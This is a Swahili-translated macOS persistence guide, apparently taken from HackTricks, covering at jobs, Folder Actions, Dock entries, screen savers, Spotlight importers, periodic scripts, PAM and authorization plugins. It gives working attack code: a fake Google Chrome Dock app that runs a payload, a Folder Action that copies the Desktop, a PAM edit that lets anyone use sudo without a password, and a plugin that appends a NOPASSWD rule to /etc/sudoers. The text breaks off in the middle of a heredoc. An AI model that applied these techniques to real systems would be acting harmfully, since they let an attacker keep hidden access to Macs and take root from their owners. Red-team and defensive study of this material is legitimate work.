### At

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji **kutekeleza** **`at`** na lazima iwe **imezimwa**
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* Unahitaji **kutekeleza** **`at`** na lazima iwe **imezimwa**

#### **Maelezo**

Kazi za `at` zinabuniwa kwa ajili ya **kupanga kazi za mara moja** zitekelezwe wakati fulani. Tofauti na kazi za cron, kazi za `at` zinaondolewa moja kwa moja baada ya utekelezaji. Ni muhimu kutambua kuwa kazi hizi ni thabiti kupitia kuanzishwa upya kwa mfumo, hivyo zinaweza kuwa na wasiwasi wa usalama chini ya hali fulani.

Kwa chaguo la **msingi** zimezimwa lakini mtumiaji wa **root** anaweza **kuwawezesha** kwa:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Hii itaunda faili ndani ya saa 1:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Angalia foleni ya kazi kwa kutumia `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Hapo juu tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuchapisha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Ikiwa kazi za AT hazijawezeshwa, kazi zilizoundwa hazitafanyika.
{% endhint %}

**Faili za kazi** zinaweza kupatikana kwenye `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Jina la faili lina orodha, nambari ya kazi, na wakati ambao imepangwa kufanya kazi. Kwa mfano, hebu tuangalie `a0001a019bdcd2`.

* `a` - hii ni orodha
* `0001a` - nambari ya kazi katika hex, `0x1a = 26`
* `019bdcd2` - wakati katika hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika decimal. Tukizidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. Aprili 27., Jumanne 7:46:00`.

Ikiwa tunachapisha faili ya kazi, tunagundua ina taarifa ile ile tuliyopata kutumia `at -c`.

### Vitendo vya Folda

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Maelezo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji kuweza kuita `osascript` na hoja kuwasiliana na **`System Events`** ili uweze kusanidi Vitendo vya Folda
* Kukiuka TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Ina ruhusa za TCC za msingi kama Desktop, Documents na Downloads

#### Mahali

* **`/Library/Scripts/Folder Action Scripts`**
* Inahitaji mizizi
* **Kichocheo**: Kufikia folda iliyotajwa
* **`~/Library/Scripts/Folder Action Scripts`**
* **Kichocheo**: Kufikia folda iliyotajwa

#### Maelezo & Utekaji

Vitendo vya Folda ni hati zinazotumiwa moja kwa moja na mabadiliko katika folda kama vile kuongeza, kuondoa vitu, au vitendo vingine kama vile kufungua au kurekebisha dirisha la folda. Vitendo hivi vinaweza kutumika kwa kazi mbalimbali, na vinaweza kuchochewa kwa njia tofauti kama kutumia UI ya Finder au amri za terminali.

Kuanzisha Vitendo vya Folda, una chaguo kama:

1. Kuunda mchakato wa Vitendo vya Folda na [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuiweka kama huduma.
2. Kuambatanisha hati kwa mkono kupitia Usanidi wa Vitendo vya Folda katika menyu ya muktadha ya folda.
3. Kutumia OSAScript kutuma ujumbe wa Tukio la Apple kwa `System Events.app` kwa kusanidi Vitendo vya Folda kwa njia ya programu.
* Mbinu hii ni muhimu hasa kwa kuingiza kitendo katika mfumo, kutoa kiwango cha uthabiti.

Hati ifuatayo ni mfano wa kile kinaweza kutekelezwa na Vitendo vya Folda:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Ili kufanya script iliyotajwa iweze kutumiwa na Matendo ya Folda, itaipasha kwa kutumia:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Baada ya hati kutekelezwa, weka Matendo ya Folda kwa kutekeleza hati hii hapa chini. Hati hii itawezesha Matendo ya Folda kwa ujumla na kuambatanisha hati iliyokwishakutekelezwa hapo awali kwenye folda ya Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Chukua script ya usanidi na:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Hii ndio njia ya kutekeleza uthabiti huu kupitia GUI:

Hii ndio script itakayotekelezwa:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Kuikusanya na: `osacompile -l JavaScript -o folder.scpt source.js`

Hamisha kwa:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Kisha, fungua programu ya `Folder Actions Setup`, chagua **folda unayotaka kufuatilia** na chagua kesi yako **`folder.scpt`** (kwa kesi yangu niliita output2.scp):

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ukifungua folda hiyo na **Finder**, script yako itatekelezwa.

Mipangilio hii ilihifadhiwa kwenye **plist** iliyoko katika **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwa muundo wa base64.

Sasa, jaribu kuandaa uthabiti huu bila ufikiaji wa GUI:

1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` kwa kuihifadhi:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Matendo ya Folda uliyojiwekea tu:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Sasa tukiwa na mazingira yasiyo na kitu

3. Nakili faili ya nakala: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua programu ya Folder Actions Setup.app ili kutumia mazingira haya: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Na hii haikufanya kazi kwangu, lakini hizi ni maagizo kutoka kwenye andiko:(
{% endhint %}

### Vielekezo vya Dock

Andiko: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji kuwa umeweka programu mbaya ndani ya mfumo
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `~/Library/Preferences/com.apple.dock.plist`
* **Kichocheo**: Wakati mtumiaji anapobonyeza programu ndani ya dock

#### Maelezo & Utekaji

Programu zote zinazoonekana kwenye Dock zimetajwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**

Inawezekana kuongeza programu tu kwa:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Kwa kutumia **mhandisi wa kijamii** unaweza **kujifanya kwa mfano Google Chrome** ndani ya dock na kisha kutekeleza script yako mwenyewe:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Vichujio vya Rangi

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Hatua maalum sana inahitajika kutokea
* Utamaliza katika sanduku lingine la mchanga
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `/Library/ColorPickers`
* Inahitaji mizizi
* Kichocheo: Tumia vichujio vya rangi
* `~/Library/ColorPickers`
* Kichocheo: Tumia vichujio vya rangi

#### Maelezo na Kudukua

**Kusanya kifurushi cha vichujio vya rangi** na nambari yako (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na ongeza konstrukta (kama katika [Sehemu ya Skrini ya Kuficha](macos-auto-start-locations.md#screen-saver)) na nakili kifurushi kwa `~/Library/ColorPickers`.

Kisha, wakati kichujio cha rangi kinachochujwa, kompyuta yako inapaswa kuwa pia.

Tafadhali kumbuka kuwa programu-jalizi inayoingiza maktaba yako ina **mchanga wa kizuizi sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Vifaa vya Finder Sync

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Maelezo**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Inatumika kukiuka sandbox: **Hapana, kwa sababu unahitaji kutekeleza programu yako mwenyewe**
* Kukiuka TCC: ???

#### Mahali

* Programu maalum

#### Maelezo & Utekaji

Mfano wa programu na Kifaa cha Finder Sync [**unaweza kupatikana hapa**](https://github.com/D00MFist/InSync).

Programu zinaweza kuwa na `Vifaa vya Finder Sync`. Kifaa hiki kitawekwa ndani ya programu itakayotekelezwa. Zaidi ya hayo, ili kifaa hicho kiweze kutekeleza nambari yake lazima iwe **imesainiwa** na cheti halali cha msanidi programu wa Apple, lazima iwe **imesandukwa** (ingawa kuna maelewano yaliyorekebishwa yanaweza kuongezwa) na lazima iwe imeandikishwa na kitu kama:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Maelezo: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf5b)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini utamaliza katika sanduku la maombi la kawaida
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `/System/Library/Screen Savers`
* Inahitaji mizizi
* **Kichocheo**: Chagua skrini ya kuokoa
* `/Library/Screen Savers`
* Inahitaji mizizi
* **Kichocheo**: Chagua skrini ya kuokoa
* `~/Library/Screen Savers`
* **Kichocheo**: Chagua skrini ya kuokoa

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Maelezo & Kudukua

Unda mradi mpya katika Xcode na chagua kiolesura ili kuzalisha **Screen Saver** mpya. Kisha, weka kanuni yako, kwa mfano kanuni ifuatayo ili kuzalisha magogo.

**Jenga** hiyo, na nakili kifurushi cha `.saver` kwa **`~/Library/Screen Savers`**. Kisha, fungua GUI ya Skrini ya Kuokoa na ikiwa tu unabonyeza juu yake, inapaswa kuzalisha magogo mengi:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Tafadhali tambua kwamba kwa sababu ndani ya ruhusa za binary inayoendesha hii kanuni (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`** utakuwa **ndani ya sanduku la kawaida la programu**.
{% endhint %}

Msimbaji wa kanuni:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Vifaa vya Spotlight

maandishi: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini utamaliza katika sanduku la programu
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)
* Sanduku la mchanga linaonekana kuwa na kikomo sana

#### Mahali

* `~/Library/Spotlight/`
* **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
* `/Library/Spotlight/`
* **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
* Inahitajika kuwa na ruhusa ya msingi
* `/System/Library/Spotlight/`
* **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
* Inahitajika kuwa na ruhusa ya msingi
* `Some.app/Contents/Library/Spotlight/`
* **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
* Inahitajika programu mpya

#### Maelezo & Utekaji

Spotlight ni kipengele cha utaftaji kilichojengwa kwenye macOS, kimeundwa kutoa watumiaji na **upatikanaji wa haraka na wa kina wa data kwenye kompyuta zao**.\
Ili kurahisisha uwezo huu wa utaftaji wa haraka, Spotlight inaendeleza **hifadhidata ya kipekee** na kuunda indeksi kwa **kuchambua faili nyingi**, kuruhusu utaftaji wa haraka kupitia majina ya faili na maudhui yao.

Mfumo wa msingi wa Spotlight unajumuisha mchakato wa kati unaoitwa 'mds', ambao unamaanisha **'metadata server'**. Mchakato huu unaratibu huduma nzima ya Spotlight. Kando na hilo, kuna 'mdworker' daemons kadhaa ambao hutekeleza majukumu mbalimbali ya matengenezo, kama vile kuunda indeksi za aina tofauti za faili (`ps -ef | grep mdworker`). Majukumu haya yanawezekana kupitia vifaa vya kuingiza vya Spotlight, au **".mdimporter bundles**", ambavyo huwezesha Spotlight kuelewa na kuunda indeksi ya maudhui katika aina mbalimbali za faili.

Vifaa au **`mdimporter`** bundles vipo katika maeneo yaliyotajwa hapo awali na ikiwa kifurushi kipya kinatokea, kinapakiwa ndani ya dakika (hakuna haja ya kuanzisha upya huduma yoyote). Vifurushi hivi lazima viashirishe ni **aina gani ya faili na vificho wanavyoweza kusimamia**, kwa njia hii, Spotlight itavitumia wakati faili mpya yenye kificho kilichotajwa inapoundwa.

Inawezekana **kupata `mdimporters` zote** zilizopakiwa kwa kukimbia:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumika kuchambua aina hizi za faili (nyongeza `.iba` na `.book` miongoni mwa zingine):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Ikiwa utachunguza Plist ya `mdimporter` nyingine huenda usipate kuingia **`UTTypeConformsTo`**. Hii ni kwa sababu ni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) iliyojengwa ndani na haitaji kutaja upanuzi.

Zaidi ya hayo, programu-jalizi za mfumo wa msingi daima zinachukua kipaumbele, hivyo mshambuliaji anaweza kupata ufikivu tu kwenye faili ambazo vinginevyo hazijachambuliwa na `mdimporters` za Apple.
{% endhint %}

Ili kuunda chombo chako cha kuingiza unaweza kuanza na mradi huu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) na kisha badilisha jina, **`CFBundleDocumentTypes`** na ongeza **`UTImportedTypeDeclarations`** ili iweze kusaidia upanuzi unayotaka kusaidia na uwakilishe katika **`schema.xml`**.\
Kisha **badilisha** nambari ya kazi **`GetMetadataForFile`** ili kutekeleza mzigo wako wakati faili yenye upanuzi uliochakatwa inapoundwa.

Hatimaye **jenga na nakili chombo chako kipya cha `.mdimporter`** kwa moja ya maeneo yaliyotangulia na unaweza kuangalia wakati wowote inapopakiwa **kwa kufuatilia magogo** au kucheki **`mdimport -L.`**

### ~~Pane ya Mapendeleo~~

{% hint style="danger" %}
Haionekani kama hii inafanya kazi tena.
{% endhint %}

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Inatumika kwa kuzidi sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Inahitaji hatua maalum ya mtumiaji
* Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Maelezo

Haionekani kama hii inafanya kazi tena.

## Kizuizi cha Mchanga cha Mzizi

{% hint style="success" %}
Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **kuzidi sanduku la mchanga** ambayo inakuruhusu tu kutekeleza kitu kwa **kuandika kwenye faili** ukiwa **mzizi** na/au kuhitaji **hali nyingine za ajabu.**
{% endhint %}

### Kipindi

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Inatumika kwa kuzidi sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa mzizi
* Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Inahitaji kuwa mzizi
* **Kichocheo**: Wakati unapofika
* `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
* Inahitaji kuwa mzizi
* **Kichocheo**: Wakati unapofika

#### Maelezo & Utekaji

Skripti za kipindi (**`/etc/periodic`**) zinatekelezwa kwa sababu ya **daemons za kuanzisha** zilizowekwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Tafadhali kumbuka kuwa skripti zilizohifadhiwa katika `/etc/periodic/` zinatekelezwa kama **mmiliki wa faili,** hivyo haitafanya kazi kwa kubadilisha haki za mamlaka. {% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Kuna hati zingine za kipindi ambazo zitatekelezwa zilizoonyeshwa katika **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ikiwa utafanikiwa kuandika faili yoyote kati ya `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` itakuwa **kutekelezwa mapema au baadaye**.

{% hint style="warning" %}
Tafadhali kumbuka kwamba script ya kipindi itatekelezwa **kama mmiliki wa script**. Kwa hivyo ikiwa mtumiaji wa kawaida anamiliki script, itatekelezwa kama mtumiaji huyo (hii inaweza kuzuia mashambulizi ya uongezaji wa mamlaka).
{% endhint %}

### PAM

Maelezo: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Maelezo: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na ruhusa ya mizizi (root)
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* Mizizi (root) inahitajika daima

#### Maelezo na Utekaji

Kwa kuwa PAM inazingatia zaidi **upenyezaji** na zisizo za programu hasidi ndani ya macOS, blogi hii haitatoa maelezo ya kina, **soma maelezo kuelewa mbinu hii vizuri**.

Angalia moduli za PAM na:
```bash
ls -l /etc/pam.d
```
Teknik ya kudumu/kuongeza mamlaka kwa kutumia PAM ni rahisi kama kuhariri moduli /etc/pam.d/sudo kwa kuongeza mwanzoni mstari:
```bash
auth       sufficient     pam_permit.so
```
Hivyo itaonekana **kama** hivi:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Na kwa hivyo jaribio lolote la kutumia **`sudo` litafanya kazi**.

{% hint style="danger" %}
Tafadhali elewa kuwa saraka hii inalindwa na TCC hivyo ni uwezekano mkubwa kwamba mtumiaji atapata ombi la kupewa ruhusa.
{% endhint %}

### Viplaga vya Idhini

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Maelezo: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na ruhusa ya msingi na kufanya mipangilio ya ziada
* Kukiuka TCC: ???

#### Mahali

* `/Library/Security/SecurityAgentPlugins/`
* Inahitaji kuwa na ruhusa ya msingi
* Pia ni muhimu kusanidi hifadhidata ya idhini kutumia programu-jalizi

#### Maelezo & Utekaji

Unaweza kuunda programu-jalizi ya idhini ambayo itatekelezwa wakati mtumiaji anapoingia ili kudumisha uthabiti. Kwa maelezo zaidi kuhusu jinsi ya kuunda moja ya programu-jalizi hizi angalia maelezo ya awali (na uwe mwangalifu, moja isiyoundwa vizuri inaweza kukufunga nje na utahitaji kusafisha Mac yako kutoka kwa hali ya kupona).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Hamisha** kifurushi hadi eneo litakalopakiwa:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Hatimaye ongeza **kanuni** ya kupakia Plugin hii:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
